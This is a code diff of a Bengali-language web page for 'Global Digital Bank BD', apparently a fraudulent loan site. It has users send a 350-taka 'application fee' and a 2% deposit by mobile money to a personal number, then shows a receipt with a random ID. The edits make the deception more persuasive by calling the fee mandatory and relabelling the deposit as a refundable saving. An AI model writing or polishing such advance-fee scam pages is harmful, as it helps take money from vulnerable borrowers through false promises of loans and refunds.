@@ -102,7 +102,7 @@
 <div class="container">
 
     <div id="step1" class="card active">
-        <h2>লোন ক্যালকুলেটর (৪%)</h2>
+        <h2>কত টাকা নিতে চান নির্বাচন করুন</h2>
         <div class="input-group">
             <label>লোনের পরিমাণ (৳)</label>
             <input type="number" id="amt" value="100000" oninput="calcLoan()">
@@ -165,11 +165,11 @@
             </select>
             <input type="text" id="acc" placeholder="অ্যাকাউন্ট নম্বর দিন" style="margin-top:10px">
         </div>
-        <button class="btn-next" onclick="nextStep(3)">ফি জমা দিন <i class="fas fa-lock"></i></button>
+        <button class="btn-next" onclick="nextStep(3)"> পরবর্তী ধাপ <i class="fas fa-lock"></i></button>
     </div>
 
     <div id="step3" class="card">
-        <h2>আবেদন ফি (৳ ৩৫০)</h2>
+        <h2>আবেদন ফি (৳ ৩৫০) বাধ্যতামূলক </h2>
         <div class="pay-box">
             <div class="pay-item nagad" onclick="openGate('Nagad', '01319701625', 'f')">
                 <i class="fas fa-money-bill-wave"></i>
@@ -186,14 +186,14 @@
             <p>নিচের নাম্বারে ৩৫০ টাকা <b>Send Money</b> করুন এবং TrxID দিন:</p>
             <div class="copy-area"><span id="fNum"></span> <button onclick="copyIt('fNum')">Copy</button></div>
             <input type="text" id="fTrx" placeholder="Enter Transaction ID">
-            <button class="btn-next" onclick="nextStep(4)">আমানত জমা করুন</button>
+            <button class="btn-next" onclick="nextStep(4)">নিশ্চিত করুন</button>
         </div>
     </div>
 
     <div id="step4" class="card">
-        <h2>নিরাপত্তা আমানত (২%)</h2>
+        <h2>সঞ্চয় জমা (২%) ফেরত পাবেন</h2>
         <div style="text-align: center; padding: 15px; background: #fff5f5; border-radius: 10px; border: 1px solid #feb2b2; margin-bottom: 20px;">
-            <p style="margin:0; font-size: 14px;">আপনার প্রদেয় আমানত:</p>
+            <p style="margin:0; font-size: 14px;">আপনার প্রদেয় আমানত আবেদন ফেরত পাবেন:</p>
             <b style="font-size: 26px; color: var(--danger);">৳ <span id="sAmtDisplay">0</span></b>
         </div>
         <div class="pay-box">
@@ -230,7 +230,7 @@
 </div>
 
 <footer>
-    <p><i class="fas fa-map-marker-alt"></i> হেড অফিস: লেভেল ৪, মতিঝিল সেন্টার, ঢাকা-১০০০।</p>
+    <p><i class="fas fa-map-marker-alt"></i> হেড অফিস: লেভেল ৪, ca . বাসা ৫৪ মতিঝিল সেন্টার, ঢাকা-১০০০।</p>
     <p>© 2026 Global Digital Bank BD. All Rights Reserved.</p>
 </footer>
 
@@ -280,11 +280,11 @@
     }
 
     function showSlip() {
-        if(!document.getElementById('sTrx').value) return alert('আমানতের TrxID দিন');
+        if(!document.getElementById('sTrx').value) return alert('সঞ্চয় TrxID দিন');
         document.getElementById('rId').innerText = "GDB-LB-" + Math.floor(100000 + Math.random() * 900000);
         document.getElementById('rName').innerText = appData.name;
         document.getElementById('rAmt').innerText = appData.loan + " ৳";
-        document.getElementById('rDep').innerText = appData.depAmt + " ৳ (Paid)";
+        document.getElementById('rDep').innerText = appData.depAmt + " ৳ (ফেরত যোগ্য)";
         nextStep(5);
     }
 
